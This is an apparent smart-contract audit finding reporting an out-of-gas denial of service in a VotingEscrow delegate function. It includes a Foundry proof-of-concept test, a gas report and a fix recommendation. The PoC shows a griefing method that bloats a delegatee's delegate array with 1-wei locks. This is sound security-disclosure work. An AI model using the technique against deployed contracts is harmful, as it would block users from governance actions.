# `MAX_DELEGATES` not sufficient to prevent potential out of gas DoS when switching between popular delegatees in `VotingEscrow::delegate`

## Summary
Calling `VotingEscrow::delegate` requires looping over an array of all the delegates of your current delegatee and also your new delegatee. While the `MAX_DELEGATES` check attempts to prevent this, it doesn't consider the scenario the arrays of both the current delegatee and future delegatee are large, but under `MAX_DELEGATES` (1024). This means that the gas consumed when transferring your delegate choice from one popular delegatee to another could be larger than the block gas limit on most EVM chains (30mil), making the transaction impossible to complete.

## Vulnerability Detail
**Proof Of Concept**
Add the following test to see the gas useage when Alice tries to switch her delegation choice from one address with 1,000 delegates to another with 1,000 delegates:

```solidity
    function test_Toad_DelegateChangeOOGDoS() public {
        address alice = makeAddr("alice");
        address aliceFirstDelegatee = makeAddr("delegate one");
        address aliceSecondDelegatee = makeAddr("delegate two");

        // Get Alice LP tokens
        DAI.mint(alice, 100 ether);
        FLOW.mint(alice, 100 ether);
        vm.startPrank(alice);
        DAI.approve(address(router), 100 ether);
        FLOW.approve(address(router), 100 ether);
        router.addLiquidity(
            address(FLOW),
            address(DAI),
            false,
            100 ether,
            100 ether,
            0,
            0,
            alice,
            block.timestamp
        );
        flowDaiPair.approve(address(escrow), type(uint256).max);
        escrow.create_lock(flowDaiPair.balanceOf(alice), 31 days);

        // Alice first delegates to aliceFirstDelegatee
        escrow.delegate(aliceFirstDelegatee);
        vm.stopPrank();

        // Add dummy delegates to both delegates
        // delegatorOne will give aliceFirstDelegatee 1000 delegates
        address delegatorOne = makeAddr("delegatorone");
        address delegatorTwo = makeAddr("delegatortwo");
        DAI.mint(delegatorOne, 100 ether);
        FLOW.mint(delegatorOne, 100 ether);
        vm.startPrank(delegatorOne);
        DAI.approve(address(router), 100 ether);
        FLOW.approve(address(router), 100 ether);
        router.addLiquidity(
            address(FLOW),
            address(DAI),
            false,
            100 ether,
            100 ether,
            0,
            0,
            delegatorOne,
            block.timestamp
        );
        flowDaiPair.approve(address(escrow), type(uint256).max);
        for(uint256 i; i < 1000; i++) {
            escrow.create_lock(1, 31 days);
        }
        escrow.delegate(aliceFirstDelegatee);
        vm.stopPrank();

        // delegatorTwo will give aliceSecondDelegatee 1000 delegates
        DAI.mint(delegatorTwo, 100 ether);
        FLOW.mint(delegatorTwo, 100 ether);
        vm.startPrank(delegatorTwo);
        DAI.approve(address(router), 100 ether);
        FLOW.approve(address(router), 100 ether);
        router.addLiquidity(
            address(FLOW),
            address(DAI),
            false,
            100 ether,
            100 ether,
            0,
            0,
            delegatorTwo,
            block.timestamp
        );
        flowDaiPair.approve(address(escrow), type(uint256).max);
        for(uint256 i; i < 1000; i++) {
            escrow.create_lock(1, 31 days);
        }
        escrow.delegate(aliceSecondDelegatee);
        vm.stopPrank();

        // When Alice tries to switch delegates the tx will run out of gas
        vm.prank(alice);
        escrow.delegate(aliceSecondDelegatee);
    }
```

Running `forge test --mt DelegateChangeOOGDoS --gas-report` will return the following numbers for the `delegate` function:
```solidity
| Function Name     | min        | avg      | median   | max      | # calls |
| delegate          | 134443     | 27862815 | 29594091 | 52128636 | 4       |
```

As you can see, the maximum gas used when calling `VotingEscrow::delegate` hits 52 million, significantly above the standard block gas limit of 30 million.

Although it might be argued that the system does not expect there to be this large number of delegates, the proof of concept also highlights how easy it would be for a malicious user to bloat out a popular delegatees array of delegates by calling `VotingEscrow::create_lock` with single wei amounts.

## Impact
This issue means that users will be unable to change delegation between two popular delegatees without first delegating someone with very delegates, and then switching to their actual desired delegatee afterwards in two separate transactions.

## Tool used

Manual Review

## Recommendation
It is likely necessary that the protocol adds a minimum lock amount in `VotingEscrow` to remove the economic viability of this attack method.
